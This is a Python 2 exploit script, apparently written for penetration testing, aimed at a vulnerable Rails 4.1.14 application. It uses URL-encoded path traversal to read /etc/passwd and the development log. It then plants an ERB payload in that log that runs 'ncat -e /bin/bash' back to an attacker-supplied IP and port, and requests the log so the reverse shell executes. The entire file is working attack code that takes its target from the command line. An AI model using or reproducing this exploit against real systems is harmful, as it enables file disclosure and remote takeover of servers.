__author__ = 'jmunoz'

# Testing Rails vulnerable version 4.1.14

import sys
import urllib2
import time
import re


# Attack Urls
etc_passwd_ulr = r"/%2fetc%2fpasswd"
taint_ls_command = r"/dashboard?fake=%3C%25%3d%20%60%6c%73%60%20%25%3E"
get_log_file = r"/%2e%2flog%2fdevelopment%2elog"
inject_reverse_shell_command = r"/dashboard?fake%3D%3C%25%3D%20%60ncat%20-e%20%2Fbin%2Fbash%20ATTACKER_IP%20PORT%60%20%25%3E"

class RailsExploit(object):

    def __init__(self, app):
        self.app = app
        self.utils = Utils()

    def check_vulnerability(self):
        # append to url /etc/passwd
        url_to_check = self.app + etc_passwd_ulr
        print "Trying to read /etc/passwd"
        print url_to_check
        regexp = "<body>(.*?)</body>"
        data = self.utils.make_request(str(url_to_check), regexp)
        if "No route matches" in data:
            return False
        else:
            return True

    def attack_target(self):
        if self.check_vulnerability():
            print "Inject reverse shell command on development.log "
            print "Insert attacker ip"
            attacker_ip = raw_input()
            print "Insert attacker port"
            attacker_port = raw_input()
            attack_path = self.app + inject_reverse_shell_command.replace("ATTACKER_IP", attacker_ip).replace("PORT", attacker_port)
            print self.app + inject_reverse_shell_command.replace("ATTACKER_IP", attacker_ip).replace("PORT", attacker_port)
            self.utils.make_request(attack_path)
            print "Getting development.log to execute the reverse shell"
            self.utils.make_request(self.app + get_log_file)


class Utils(object):

    def make_request(self, url, regexp=None):
        time.sleep(3)
        req = urllib2.Request(url)
        try:
            raw_data = urllib2.urlopen(req)
            raw_content = raw_data.read()
            if regexp:
                self.get_output_from_response(regexp, raw_content)
        except urllib2.HTTPError, error:
            raw_content = error.read()
        return raw_content

    def get_output_from_response(self, regexp, response):
        matched_elem = re.search(regexp, response, re.DOTALL | re.X)
        if matched_elem:
            matched = matched_elem.group()
            print "\n"
            print "=" * 42
            print matched
            print "=" * 42
            print "\n"
        else:
            print "Cannot match regexp in response"


rails_exploit = RailsExploit(sys.argv[1])
rails_exploit.attack_target()